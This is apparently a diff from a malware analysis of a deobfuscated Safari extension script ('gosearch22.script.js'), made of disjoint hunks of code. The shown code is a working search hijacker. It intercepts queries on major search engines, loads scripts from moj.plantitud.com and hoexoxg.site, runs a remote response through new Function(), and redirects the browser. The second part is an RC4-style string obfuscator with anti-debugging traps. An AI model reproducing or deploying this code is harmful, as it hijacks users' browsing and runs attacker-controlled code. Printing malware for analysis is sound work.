     if (a["TeFLu"] !== a["Zqywp"]) {
@@ -1250,27 +837,12 @@ $jscomp["polyfillIs" + "olated"] = function(layoutSets, c, e, v) {
 };
 $jscomp["polyfill"]("Object.is", function(animated) {
   var node = {};
-  /**
-   * @param {?} x_or_y
-   * @param {?} y
-   * @return {?}
-   */
   node["MCyFh"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /**
-   * @param {(boolean|number|string)} _num2
-   * @param {(boolean|number|string)} _num1
-   * @return {?}
-   */
   node["ALxWN"] = function(_num2, _num1) {
     return _num2 / _num1;
   };
-  /**
-   * @param {?} optionsValue
-   * @param {?} value
-   * @return {?}
-   */
   node["WLHGq"] = function(optionsValue, value) {
     return optionsValue !== value;
   };
@@ -1284,107 +856,48 @@ setInterval(function() {
 }, 4E3);
 $jscomp["polyfill"]("Array.prot" + "otype.incl" + "udes", function(obj) {
   var PL$6 = {};
-  /**
-   * @param {(boolean|number|string)} rowTop
-   * @param {(boolean|number|string)} clientHeight
-   * @return {?}
-   */
   PL$6["sctZX"] = function(rowTop, clientHeight) {
     return rowTop < clientHeight;
   };
-  /**
-   * @param {(number|string)} minWorkers
-   * @param {!Object} options
-   * @return {?}
-   */
   PL$6["KNwkT"] = function(minWorkers, options) {
     return minWorkers in options;
   };
-  /**
-   * @param {?} modstatus
-   * @param {?} mmCoreNotDownloadable
-   * @return {?}
-   */
   PL$6["wiats"] = function(modstatus, mmCoreNotDownloadable) {
     return modstatus != mmCoreNotDownloadable;
   };
-  /**
-   * @param {?} x_or_y
-   * @param {?} y
-   * @return {?}
-   */
   PL$6["wKBGR"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /** @type {string} */
   PL$6["qGKkk"] = "aDuqO";
-  /** @type {string} */
   PL$6["RAGaL"] = "FRvxY";
-  /** @type {string} */
   PL$6["Tputh"] = "3|4|5|0|2|" + "1";
-  /**
-   * @param {(Date|number)} _num1
-   * @param {!Date} _num2
-   * @return {?}
-   */
   PL$6["fEwRH"] = function(_num1, _num2) {
     return _num1 > _num2;
   };
-  /**
-   * @param {(Object|number)} buckets
-   * @param {!Object} name
-   * @return {?}
-   */
   PL$6["VqpCZ"] = function(buckets, name) {
     return buckets + name;
   };
-  /**
-   * @param {(boolean|number|string)} rowTop
-   * @param {(boolean|number|string)} clientHeight
-   * @return {?}
-   */
   PL$6["vhVuS"] = function(rowTop, clientHeight) {
     return rowTop < clientHeight;
   };
   var PL$16 = PL$6;
   return obj ? obj : function(name, data) {
     var currentRelations = {};
-    /**
-     * @param {(boolean|number|string)} b
-     * @param {(boolean|number|string)} a
-     * @return {?}
-     */
     currentRelations["wOZRI"] = function(b, a) {
       return b - a;
     };
-    /**
-     * @param {?} PL$15
-     * @param {?} texthtml
-     * @return {?}
-     */
     currentRelations["gSgWJ"] = function(PL$15, texthtml) {
       return PL$16["sctZX"](PL$15, texthtml);
     };
-    /**
-     * @param {?} PL$15
-     * @param {?} texthtml
-     * @return {?}
-     */
     currentRelations["xyOMo"] = function(PL$15, texthtml) {
       return PL$16["KNwkT"](PL$15, texthtml);
     };
-    /**
-     * @param {?} PL$15
-     * @param {?} texthtml
-     * @return {?}
-     */
     currentRelations["BnqXR"] = function(PL$15, texthtml) {
       return PL$16["wiats"](PL$15, texthtml);
     };
     var validators = currentRelations;
     if (PL$16["wKBGR"](PL$16["qGKkk"], PL$16["RAGaL"])) {
       var callbackVals = ("2|1|5|3|4|" + "0|6")["split"]("|");
-      /** @type {number} */
       var callbackCount = 0;
       for (; !![];) {
         switch(callbackVals[callbackCount++]) {
@@ -1404,7 +917,6 @@ $jscomp["polyfill"]("Array.prot" + "otype.incl" + "udes", function(obj) {
             value = data[obj];
             continue;
           case "5":
-            /** @type {number} */
             value = 0;
             for (; validators["gSgWJ"](value, validators["wOZRI"](obj["length"], 1)); value++) {
               var val = obj[value];
@@ -1428,7 +940,6 @@ $jscomp["polyfill"]("Array.prot" + "otype.incl" + "udes", function(obj) {
       }
     } else {
       var callbackVals = PL$16["Tputh"]["split"]("|");
-      /** @type {number} */
       var callbackCount = 0;
       for (; !![];) {
         switch(callbackVals[callbackCount++]) {
@@ -1453,7 +964,6 @@ $jscomp["polyfill"]("Array.prot" + "otype.incl" + "udes", function(obj) {
             continue;
           case "4":
             if (value instanceof String) {
-              /** @type {string} */
               value = String(value);
             }
             continue;
@@ -1466,45 +976,18 @@ $jscomp["polyfill"]("Array.prot" + "otype.incl" + "udes", function(obj) {
     }
   };
 }, "es7", "es3");
-/**
- * @param {string} gameFolder
- * @param {?} data
- * @param {string} boardManager
- * @return {?}
- */
 $jscomp["checkStrin" + "gArgs"] = function(gameFolder, data, boardManager) {
   var currentRelations = {};
-  /**
-   * @param {?} state
-   * @param {?} inUse
-   * @return {?}
-   */
   currentRelations["HapgX"] = function(state, inUse) {
     return state == inUse;
   };
-  /**
-   * @param {(Object|number)} buckets
-   * @param {!Object} name
-   * @return {?}
-   */
   currentRelations["zzeGg"] = function(buckets, name) {
     return buckets + name;
   };
-  /** @type {string} */
   currentRelations["YpMqH"] = " must not " + "be null or" + " undefined";
-  /**
-   * @param {(ArrayBuffer|ArrayBufferView|Blob|string)} impromptuInstance
-   * @param {!Function} Impromptu
-   * @return {?}
-   */
   currentRelations["dvrxe"] = function(impromptuInstance, Impromptu) {
     return impromptuInstance instanceof Impromptu;
   };
-  /**
-   * @param {(Object|number)} buckets
-   * @param {!Object} name
-   * @return {?}
-   */
   currentRelations["TnBEt"] = function(buckets, name) {
     return buckets + name;
   };
@@ -1516,31 +999,14 @@ $jscomp["checkStrin" + "gArgs"] = function(gameFolder, data, boardManager) {
 };
 $jscomp["polyfill"]("String.pro" + "totype.inc" + "ludes", function(canCreateDiscussions) {
   var currentRelations = {};
-  /**
-   * @param {?} x_or_y
-   * @param {?} y
-   * @return {?}
-   */
   currentRelations["hAVDR"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /** @type {string} */
   currentRelations["VZLTI"] = "HNMAN";
-  /** @type {string} */
   currentRelations["kKWZI"] = "IgBwG";
-  /**
-   * @param {?} optionsValue
-   * @param {?} value
-   * @return {?}
-   */
   currentRelations["zPpOU"] = function(optionsValue, value) {
     return optionsValue !== value;
   };
-  /**
-   * @param {number} isPrevType
-   * @param {boolean} isCurrentType
-   * @return {?}
-   */
   currentRelations["wnCXG"] = function(isPrevType, isCurrentType) {
     return isPrevType || isCurrentType;
   };
@@ -1548,7 +1014,6 @@ $jscomp["polyfill"]("String.pro" + "totype.inc" + "ludes", function(canCreateDis
   return canCreateDiscussions ? canCreateDiscussions : function(classNAME, data) {
     if (command_codes["hAVDR"](command_codes["VZLTI"], command_codes["kKWZI"])) {
       var denies = fn["apply"](context, arguments);
-      /** @type {null} */
       fn = null;
       return denies;
     } else {
@@ -1557,264 +1022,112 @@ $jscomp["polyfill"]("String.pro" + "totype.inc" + "ludes", function(canCreateDis
   };
 }, "es6", "es3");
 var xhr;
-/** @type {string} */
 var eventName = "beforeload";
-/** @type {boolean} */
 var isSafari13OrLater = null != (ver = navigator["appVersion"]["match"](/version\/(\d+)/i)) && 13 <= ver[1];
 addEventListener(eventName, function(canCreateDiscussions) {
   var obj = {};
-  /**
-   * @param {?} x_or_y
-   * @param {?} y
-   * @return {?}
-   */
   obj["JoIJc"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /** @type {string} */
   obj["JYSiN"] = "YisOc";
-  /**
-   * @param {?} saveNotifs
-   * @param {?} notifications
-   * @return {?}
-   */
   obj["kDqqk"] = function(saveNotifs, notifications) {
     return saveNotifs(notifications);
   };
-  /**
-   * @param {?} x_or_y
-   * @param {?} y
-   * @return {?}
-   */
   obj["kkKdz"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /**
-   * @param {(boolean|number|string)} _num2
-   * @param {(boolean|number|string)} _num1
-   * @return {?}
-   */
   obj["ZhRdW"] = function(_num2, _num1) {
     return _num2 / _num1;
   };
-  /**
-   * @param {?} letter
-   * @param {?} all
-   * @return {?}
-   */
   obj["zGPfH"] = function(letter, all) {
     return letter == all;
   };
-  /** @type {string} */
   obj["HiEgJ"] = "onCqt";
-  /** @type {string} */
   obj["VpZKn"] = "info";
-  /**
-   * @param {?} saveNotifs
-   * @param {?} notifications
-   * @return {?}
-   */
   obj["ntIza"] = function(saveNotifs, notifications) {
     return saveNotifs(notifications);
   };
-  /**
-   * @param {?} saveNotifs
-   * @param {?} notifications
-   * @return {?}
-   */
   obj["eZmva"] = function(saveNotifs, notifications) {
     return saveNotifs(notifications);
   };
-  /**
-   * @param {?} x_or_y
-   * @param {?} y
-   * @return {?}
-   */
   obj["LTzVO"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /** @type {string} */
   obj["Ekfap"] = "LDBCB";
-  /**
-   * @param {?} saveNotifs
-   * @return {?}
-   */
   obj["ybZhr"] = function(saveNotifs) {
     return saveNotifs();
   };
-  /**
-   * @param {?} optionsValue
-   * @param {?} value
-   * @return {?}
-   */
   obj["pqZww"] = function(optionsValue, value) {
     return optionsValue !== value;
   };
-  /** @type {string} */
   obj["YHrSW"] = "https://mo" + "j.plantitu" + "d.com/stat" + "ic/gs/s.js";
-  /**
-   * @param {(Object|number)} buckets
-   * @param {!Object} name
-   * @return {?}
-   */
   obj["Fkmum"] = function(buckets, name) {
     return buckets + name;
   };
-  /** @type {string} */
   obj["efkGB"] = ";return st" + 'atus("';
-  /**
-   * @param {?} f
-   * @param {?} widthCtrl
-   * @return {?}
-   */
   obj["qhntV"] = function(f, widthCtrl) {
     return f(widthCtrl);
   };
-  /**
-   * @param {?} f
-   * @param {?} widthCtrl
-   * @return {?}
-   */
   obj["BqKHm"] = function(f, widthCtrl) {
     return f(widthCtrl);
   };
-  /** @type {string} */
   obj["pMnaR"] = "PghYb";
-  /** @type {string} */
   obj["wLfeG"] = "none";
-  /** @type {string} */
   obj["enFtF"] = "debu";
-  /** @type {string} */
   obj["MnCHh"] = "gger";
-  /** @type {string} */
   obj["xbetY"] = "stateObjec" + "t";
-  /**
-   * @param {?} optionsValue
-   * @param {?} value
-   * @return {?}
-   */
   obj["GYIEc"] = function(optionsValue, value) {
     return optionsValue !== value;
   };
-  /** @type {string} */
   obj["iuuTY"] = "mRWft";
-  /**
-   * @param {?} x_or_y 5142
-   * @param {?} y
-   * @return {?}
-   */
   obj["ZqSjr"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /** @type {string} */
   obj["ockTq"] = "0|1|2|4|3";
-  /**
-   * @param {?} callback
-   * @param {?} identifierPositions
-   * @return {?}
-   */
   obj["RAqgJ"] = function(callback, identifierPositions) {
     return callback(identifierPositions);
   };
-  /**
-   * @param {?} saveNotifs
-   * @param {?} notifications
-   * @return {?}
-   */
   obj["OqCiT"] = function(saveNotifs, notifications) {
     return saveNotifs(notifications);
   };
-  /**
-   * @param {(boolean|number|string)} mid_OR_high
-   * @param {(boolean|number|string)} high_OR_null
-   * @return {?}
-   */
   obj["puXEi"] = function(mid_OR_high, high_OR_null) {
     return mid_OR_high <= high_OR_null;
   };
-  /**
-   * @param {(boolean|number|string)} _num2
-   * @param {(boolean|number|string)} _num1
-   * @return {?}
-   */
   obj["PNuAU"] = function(_num2, _num1) {
     return _num2 / _num1;
   };
-  /** @type {string} */
   obj["IQPhl"] = "google.";
-  /** @type {string} */
   obj["NhQJI"] = "yahoo.";
-  /** @type {string} */
   obj["Cspsr"] = "bing.";
-  /** @type {string} */
   obj["dSCrp"] = "duckduckgo" + ".";
-  /** @type {string} */
   obj["tLgUF"] = "yandex.";
-  /** @type {string} */
   obj["RVBue"] = '[src="http' + "s://www.ho" + "exoxg.site" + "/static/s/" + 'app.js"]';
-  /** @type {string} */
   obj["GLgNM"] = "JAhJQ";
-  /** @type {string} */
   obj["brJeG"] = "src";
-  /** @type {string} */
   obj["bdNuj"] = "https://ww" + "w.hoexoxg." + "site/stati" + "c/s/app.js";
   var data = obj;
   if (!isSafari13OrLater && window["top"] === window) {
     if (!document["referrer"] && location["host"] && location["search"] && location["href"] && (location["host"]["includes"](data["IQPhl"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location["host"]["includes"](data["NhQJI"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search.*?[?&]p=[^&].*$/) || location["host"]["includes"](data["Cspsr"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location["host"]["includes"](data["dSCrp"]) && 
     location["href"]["match"](/^https?:\/\/[^\/]+\/\?.*?\bq\b=[^&].*$/) || location["host"]["includes"](data["tLgUF"]) && location["href"]["match"](/^https?:\/\/[^\/]+\/search[\/]?\?.*?\btext\b=[^&].*$/))) {
-      /**
-       * @param {boolean} size
-       * @return {?}
-       */
       var get = function(size) {
         var namespacedData = {};
-        /**
-         * @param {?} _relatedTarget
-         * @param {?} value2
-         * @return {?}
-         */
         namespacedData["NDkPJ"] = function(_relatedTarget, value2) {
           return data["kkKdz"](_relatedTarget, value2);
         };
-        /**
-         * @param {?} optionsValue
-         * @param {?} value
-         * @return {?}
-         */
         namespacedData["ImABp"] = function(optionsValue, value) {
           return optionsValue !== value;
         };
-        /**
-         * @param {?} _relatedTarget
-         * @param {?} value2
-         * @return {?}
-         */
         namespacedData["UxvDC"] = function(_relatedTarget, value2) {
           return data["ZhRdW"](_relatedTarget, value2);
         };
-        /**
-         * @param {?} _relatedTarget
-         * @param {?} value2
-         * @return {?}
-         */
         namespacedData["oBxjj"] = function(_relatedTarget, value2) {
           return data["zGPfH"](_relatedTarget, value2);
         };
         namespacedData["DgwsO"] = data["HiEgJ"];
         namespacedData["DqVyF"] = data["VpZKn"];
-        /**
-         * @param {?} _relatedTarget
-         * @param {?} value2
-         * @return {?}
-         */
         namespacedData["PbQri"] = function(_relatedTarget, value2) {
           return data["ntIza"](_relatedTarget, value2);
         };
-        /**
-         * @param {?} _relatedTarget
-         * @param {?} value2
-         * @return {?}
-         */
         namespacedData["vvNlP"] = function(_relatedTarget, value2) {
           return data["eZmva"](_relatedTarget, value2);
         };
@@ -1826,17 +1139,11 @@ addEventListener(eventName, function(canCreateDiscussions) {
           if (xhr && data["pqZww"](void 0, xhr)) {
             xhr["abort"]();
           }
-          /** @type {!XMLHttpRequest} */
           xhr = new XMLHttpRequest;
-          /** @type {number} */
           xhr["timeout"] = 1E3;
-          /**
-           * @return {?}
-           */
           xhr["ontimeout"] = function() {
             if (data["JoIJc"](data["JYSiN"], "rqJsy")) {
               var denies = fn["apply"](context, arguments);
-              /** @type {null} */
               fn = null;
               return denies;
             } else {
@@ -1845,48 +1152,20 @@ addEventListener(eventName, function(canCreateDiscussions) {
               }
             }
           };
-          /**
-           * @return {?}
-           */
           xhr["onload"] = function() {
             var currentRelations = {};
-            /**
-             * @param {?} disabled
-             * @param {?} status
-             * @return {?}
-             */
             currentRelations["nZhyS"] = function(disabled, status) {
               return _submitBtn["NDkPJ"](disabled, status);
             };
-            /**
-             * @param {?} disabled
-             * @param {?} status
-             * @return {?}
-             */
             currentRelations["GHVVu"] = function(disabled, status) {
               return _submitBtn["ImABp"](disabled, status);
             };
-            /**
-             * @param {?} disabled
-             * @param {?} status
-             * @return {?}
-             */
             currentRelations["kionv"] = function(disabled, status) {
               return _submitBtn["NDkPJ"](disabled, status);
             };
-            /**
-             * @param {?} disabled
-             * @param {?} status
-             * @return {?}
-             */
             currentRelations["QFpCU"] = function(disabled, status) {
               return _submitBtn["UxvDC"](disabled, status);
             };
-            /**
-             * @param {?} disabled
-             * @param {?} status
-             * @return {?}
-             */
             currentRelations["tGtBF"] = function(disabled, status) {
               return _submitBtn["ImABp"](disabled, status);
             };
@@ -1913,9 +1192,6 @@ addEventListener(eventName, function(canCreateDiscussions) {
               }
             }
           };
-          /**
-           * @return {undefined}
-           */
           xhr["onerror"] = function() {
             update(false);
           };
@@ -1925,17 +1201,10 @@ addEventListener(eventName, function(canCreateDiscussions) {
           return !![];
         }
       };
-      /**
-       * @param {?} position
-       * @return {undefined}
-       */
       var scroll = function(position) {
         position = (new Function(data["Fkmum"](data["Fkmum"](position + data["efkGB"], location["href"]), '")')))["call"]();
         data["qhntV"](update, position);
       };
-      /**
-       * @return {?}
-       */
       var _positionActiveTinyMCE = function() {
         if (data["pMnaR"] === data["pMnaR"]) {
           canCreateDiscussions["preventDef" + "ault"]();
@@ -1950,10 +1219,6 @@ addEventListener(eventName, function(canCreateDiscussions) {
           }
         }
       };
-      /**
-       * @param {boolean} data
-       * @return {undefined}
-       */
       var update = function(data) {
         if (data) {
           data["ybZhr"](_positionActiveTinyMCE);
@@ -1971,13 +1236,11 @@ addEventListener(eventName, function(canCreateDiscussions) {
         }
         var details = {};
         details["url"] = location["href"];
-        /** @type {boolean} */
         details["status"] = data;
         safari["extension"]["dispatchMe" + "ssage"](eventName, details);
       };
       (function() {
         var callbackVals = data["ockTq"]["split"]("|");
-        /** @type {number} */
         var callbackCount = 0;
         for (; !![];) {
           switch(callbackVals[callbackCount++]) {
@@ -2016,10 +1279,8 @@ addEventListener(eventName, function(canCreateDiscussions) {
             case "4":
               if (value && void 0 !== value && data["ZqSjr"](value["url"], location["href"])) {
                 value = value["timestamp"];
-                /** @type {boolean} */
                 value = !value || void 0 === value || data["puXEi"](1, data["PNuAU"](Date["now"]() - value, 1E3)) ? true : false;
               } else {
-                /** @type {boolean} */
                 value = true;
               }
               continue;
@@ -2046,57 +1307,27 @@ safari["self"]["addEventLi" + "stener"]("message", function(body) {
     window["location"]["replace"](body["message"]["url"]);
   }
 });
-/**
- * @param {?} n
- * @return {?}
- */
 function d(n) {
-  /**
-   * @param {?} data
-   * @return {?}
-   */
   function update(data) {
     var InitialSetupController = {};
-    /**
-     * @param {?} saveNotifs
-     * @return {?}
-     */
     InitialSetupController["ZBnUA"] = function(saveNotifs) {
       return saveNotifs();
     };
-    /**
-     * @param {(Object|number)} DIR
-     * @param {!Object} name
-     * @return {?}
-     */
     InitialSetupController["RZtwT"] = function(DIR, name) {
       return DIR + name;
     };
-    /**
-     * @param {(Object|number)} buckets
-     * @param {!Object} name
-     * @return {?}
-     */
     InitialSetupController["SzVPc"] = function(buckets, name) {
       return buckets + name;
     };
-    /**
-     * @param {?} addedNodesArray
-     * @param {?} dr
-     * @return {?}
-     */
     InitialSetupController["MSIuy"] = function(addedNodesArray, dr) {
       return options["XDcHC"](addedNodesArray, dr);
     };
-    /** @type {string} */
     InitialSetupController["hJySJ"] = "lQJpl";
-    /** @type {string} */
     InitialSetupController["VIVVZ"] = "QMGfP";
     var controller = InitialSetupController;
     if (options["piOLC"](options["yEBoB"], options["rOjIw"])) {
       if (fn) {
         var newValue = fn["apply"](context, arguments);
-        /** @type {null} */
         fn = null;
         return newValue;
       }
@@ -2119,17 +1350,14 @@ function d(n) {
           } else {
             (function() {
               if (controller["MSIuy"](controller["hJySJ"], controller["VIVVZ"])) {
-                /** @type {!Function} */
                 var row = firstCall ? function() {
                   if (fn) {
                     var denies = fn["apply"](context, arguments);
-                    /** @type {null} */
                     fn = null;
                     return denies;
                   }
                 } : function() {
                 };
-                /** @type {boolean} */
                 firstCall = ![];
                 return row;
               } else {
@@ -2143,109 +1371,47 @@ function d(n) {
     }
   }
   var headers = {};
-  /**
-   * @param {?} x_or_y
-   * @param {?} y
-   * @return {?}
-   */
   headers["XDcHC"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /**
-   * @param {?} x_or_y 5142
-   * @param {?} y
-   * @return {?}
-   */
   headers["piOLC"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /** @type {string} */
   headers["yEBoB"] = "oYzse";
-  /** @type {string} */
   headers["rOjIw"] = "oPJQh";
-  /** @type {string} */
   headers["dfvDm"] = "string";
-  /** @type {string} */
   headers["dEDjy"] = "while (tru" + "e) {}";
-  /**
-   * @param {?} optionsValue
-   * @param {?} value
-   * @return {?}
-   */
   headers["oBHDi"] = function(optionsValue, value) {
     return optionsValue !== value;
   };
-  /** @type {string} */
   headers["lNQWJ"] = "XdVag";
-  /**
-   * @param {(Object|number)} buckets
-   * @param {!Object} name
-   * @return {?}
-   */
   headers["oEuZl"] = function(buckets, name) {
     return buckets + name;
   };
-  /**
-   * @param {(boolean|number|string)} _num2
-   * @param {(boolean|number|string)} _num1
-   * @return {?}
-   */
   headers["rRNYx"] = function(_num2, _num1) {
     return _num2 / _num1;
   };
-  /** @type {string} */
   headers["UGyZy"] = "length";
-  /**
-   * @param {?} x_or_y
-   * @param {?} y
-   * @return {?}
-   */
   headers["VJQoM"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /**
-   * @param {(boolean|number|string)} number_to_dividee
-   * @param {(boolean|number|string)} divided_by
-   * @return {?}
-   */
   headers["WUyQz"] = function(number_to_dividee, divided_by) {
     return number_to_dividee % divided_by;
   };
-  /**
-   * @param {?} dataSourceIndex
-   * @param {?} all
-   * @return {?}
-   */
   headers["kixsA"] = function(dataSourceIndex, all) {
     return dataSourceIndex !== all;
   };
-  /** @type {string} */
   headers["glETU"] = "rtMIy";
-  /** @type {string} */
   headers["YTZsf"] = "NMvQw";
-  /** @type {string} */
   headers["cgmTm"] = "debu";
-  /**
-   * @param {(Object|number)} buckets
-   * @param {!Object} name
-   * @return {?}
-   */
   headers["qIEHj"] = function(buckets, name) {
     return buckets + name;
   };
-  /** @type {string} */
   headers["UudQw"] = "gger";
-  /** @type {string} */
   headers["cXzfQ"] = "stateObjec" + "t";
-  /**
-   * @param {?} saveNotifs
-   * @param {?} notifications
-   * @return {?}
-   */
   headers["bDFeq"] = function(saveNotifs, notifications) {
     return saveNotifs(notifications);
   };
-  /** @type {string} */
   headers["UAcwT"] = "none";
   var options = headers;
   try {
@@ -2271,7 +1437,6 @@ gosearch22.script.js - de-obfuscated on my custom JS sandbox (it includes a modu
 
 ```js
 'use strict';
-
 var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG", "w492V8KNwrc=", "XFtr", "YcOmw41Mw6U=", "wqAWwrHCryXDngUnw5fCrg==", "CCo/biE=", "w77DhiTDsV4=", "wqNew7HCiMOrZXU=", "wpdLw4jCv8Ok", "w60Ow5fDrRA=", "MsOIwqYPPn7DmnzDvMO8", "a8OQw5low45iw4s=", "wrhyw5jCusK1JSdfw5dy", "wr1Jw6XCpMKS", "w70QGMKowrk=", "w44hw4/DkjU=", "Zgd8wrnDgw==", "AMKGHHbCvw==", "wqoNw4xkwoU=", "w4oSFmhE", "AsKoY8Or", "WsOTwo/DpRtBw5w=", "wq3DqwXDpj4Uwrk=", "w4DDisK3wrLCmA==", "XMOoBmo=", "wocWw5TDhh0=",
     "ZTHCo8OKwrs=", "OsKEPEfClA==", "w5hTXsKlwofCjw==", "w5cBAMKSwoE=", "w6cENUAjwr1I", "wpzDssO+w4ht", "JFJPfTA=", "w6kCw4jDtA==", "wpPDj8Obw6pB", "w6AMKlw=", "a8O9woXDjw4=", "wpskaStD", "ZMO0RXIpTcKx", "bcOSJkdceMOpWFg=", "A8OrwoQ=", "w6gsDRPCt8OwR8KBKzo=", "Y8O+SXQ=", "YsOAw4lww4tww43DrWsI", "w7PCvsK4fw8=", "TU3DtWFO", "wrc3wpXDiGc=", "wrDCkwTCr8Ov", "wrQLwovCpws=", "woZRw57DsxI=", "wpvCg2ki", "w5fDisORwrLCtsKvwpjDggtO", "D8O2w5Ebwp3DqcOtw5Q=", "SB9zwpLDkA==", "w5t6dcKtwp8=", "ScKqw5bCn8Kt", "w5kFIcKEwps=",
     "w5cNOQPCpQ==", "WcOXwqYMw4U=", "w5sOw4QrRg==", "w7MCKkkpwrVdcDA=", "DT8tRQ8=", "fVbDsMKtwrvCnU5bNhA=", "cUfDuA==", "HMOWwoEcPA==", "w6Bfw48IOQ==", "O8KCwoTChgrDg8Kg", "wpHChXQ3w48TJMOGwobCpQ==", "wq12w4LDkjg=", "w7BMw5wWRA==", "w5oUwoYoIX07BMOew60=", "wpHDp8Kjw5d7wqAJO3V2", "w5nCrsKZZhg=", "w6QGw5cedA==", "woABw6nDvAE=", "w6rDhxbDnFonUjA=", "w4Q6FyjCjQ==", "YMKXw5bCsMKn", "HikCNMOvwqU=", "e8OSOF1fbsO1W0fCuA==", "enFjw6Yk", "CcOaw4odwoI=", "ZSrCicOzwo0=", "w4wOCWZcTw==", "PsK3GFHCvQ==", "wrLCiDnCocOFw75iw77CpsKH",
@@ -2296,13 +1461,11 @@ var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG
     "worCpBLCkg==", "wp5GQ8OGwro=", "wqs2bTtX", "wqBWw7/CjsOU", "A8K0ZcOhJnRoAQ==", "wpnDtMO8w5xx", "wqUHw4vDhxs=", "wqdVw5bCksKB", "w5QqMcK0wo8=", "w49NXsK3woPCkcOhwqrDqsKu", "w6oeKVwuwqhUeA==", "wr3DrcOcw4Rf", "wr8Rwq3Csw==", "Fz4YKg==", "w6UUw7/Dogg=", "UsO7wqAmw4hIwpxlw4gx", "SXfDkEZ3Gkdmf0k=", "w6k0wroQIA==", "SWfDo8K/woE=", "wrjDgg7Dnjo=", "BiUBNsOowrnDqzIz", "wqjDksK5Z8K/CMKOw7vDsMK8"
 ];
 (function (params, content) {
-
     var fn = function (selected_image) {
         for (; --selected_image;) {
             params.push(params.shift());
         }
     };
-
     var build = function () {
         var target = {
             "data": {
@@ -2311,26 +1474,20 @@ var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG
             },
             "setCookie": function (data, name, uri, headers) {
                 headers = headers || {};
-
                 var url = name + "=" + uri;
-
                 var q = 0;
-
                 var i = 0;
                 var key = data.length;
                 for (; i < key; i++) {
                     var d = data[i];
-
                     url = url + ("; " + d);
                     var value = data[d];
                     data.push(value);
                     key = data.length;
                     if (value !== true) {
-
                         url = url + ("=" + value);
                     }
                 }
-
                 headers.cookie = url;
             },
             "removeCookie": function () {
@@ -2341,7 +1498,6 @@ var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG
                     return canCreateDiscussions;
                 };
                 var v = match(new RegExp("(?:^|; )" + href.replace(/([.$?*|{}()[]\/+^])/g, "$1") + "=([^;]*)"));
-
                 var test = function (callback, i) {
                     callback(++i);
                 };
@@ -2349,15 +1505,11 @@ var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG
                 return v ? decodeURIComponent(v[1]) : undefined;
             }
         };
-
         var init = function () {
-
             var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
             return test.test(target.removeCookie.toString());
         };
-
         target.updateCookie = init;
-
         var array = "";
         var k = target.updateCookie();
         if (!k) {
@@ -2372,38 +1524,29 @@ var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG
     };
     build();
 })(a0a, 367);
-
 var a0b = function (m, gamma) {
-
     m = m - 0;
     var l = a0a[m];
     if (a0b.yYCZAh === undefined) {
         (function () {
-
             var unescape = function () {
                 var source;
                 try {
                     source = Function("return (function() " + '{}.constructor("return this")( )' + ");")();
                 } catch (l) {
-
                     source = window;
                 }
                 return source;
             };
             var s_utf8 = unescape();
-
             var listeners = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
             if (!s_utf8.atob) {
-
                 s_utf8.atob = function (i) {
                     var str = String(i).replace(/=+$/, "");
-
                     var pix_color = "";
-
                     var bc = 0;
                     var bs;
                     var buffer;
-
                     var Y = 0;
                     for (; buffer = str.charAt(Y++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String.fromCharCode(255 & bs >> (-2 * bc & 6)) : 0) {
                         buffer = listeners.indexOf(buffer);
@@ -2412,54 +1555,36 @@ var a0b = function (m, gamma) {
                 };
             }
         })();
-
         var testcase = function (data, fn) {
-
             var result = [];
-
             var i = 0;
             var word;
-
             var testResult = "";
-
             var tempData = "";
-
             data = atob(data);
-
             var val = 0;
             var key = data.length;
             for (; val < key; val++) {
-
                 tempData = tempData + ("%" + ("00" + data.charCodeAt(val).toString(16)).slice(-2));
             }
-
             data = decodeURIComponent(tempData);
             var j;
-
             j = 0;
             for (; j < 256; j++) {
-
                 result[j] = j;
             }
-
             j = 0;
             for (; j < 256; j++) {
-
                 i = (i + result[j] + fn.charCodeAt(j % fn.length)) % 256;
                 word = result[j];
                 result[j] = result[i];
                 result[i] = word;
             }
-
             j = 0;
-
             i = 0;
-
             var PL$19 = 0;
             for (; PL$19 < data.length; PL$19++) {
-
                 j = (j + 1) % 256;
-
                 i = (i + result[j]) % 256;
                 word = result[j];
                 result[j] = result[i];
@@ -2468,47 +1593,34 @@ var a0b = function (m, gamma) {
             }
             return testResult;
         };
-
         a0b.VqQkxC = testcase;
         a0b.HXMKWI = {};
-
         a0b.yYCZAh = true;
     }
     var o = a0b.HXMKWI[m];
     if (o === undefined) {
         if (a0b.avdWvu === undefined) {
-
             var WMCacheControl = function (deny) {
                 this.mpnbTz = deny;
-
                 this.TQjLvW = [1, 0, 0];
-
                 this.dNECWX = function () {
                     return "newState";
                 };
-
                 this.TAlOar = "\\w+ *\\(\\) *{\\w+ *";
-
                 this.yLVawE = "['|\"].+['|\"];? *}";
             };
-
             WMCacheControl.prototype.VyqkgG = function () {
-
                 var test = new RegExp(this.TAlOar + this.yLVawE);
-
